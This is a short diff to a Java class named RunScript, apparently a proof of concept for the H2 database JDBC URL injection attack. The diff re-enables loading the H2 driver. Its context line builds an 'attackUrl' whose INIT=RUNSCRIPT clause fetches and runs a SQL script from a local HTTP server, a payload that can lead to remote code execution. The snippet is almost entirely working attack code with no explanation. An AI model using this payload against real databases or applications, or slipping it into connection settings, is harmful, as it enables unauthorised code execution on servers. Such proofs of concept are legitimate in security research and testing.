@@ -15,7 +15,7 @@ import java.sql.DriverManager;
  */
 public class RunScript {
     public static void main(String[] args) throws Exception {
-//        Class.forName("org.h2.Driver");
+        Class.forName("org.h2.Driver");
 
         String attackUrl = "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:1234/poc.sql'";
         Connection connection = DriverManager.getConnection(attackUrl);
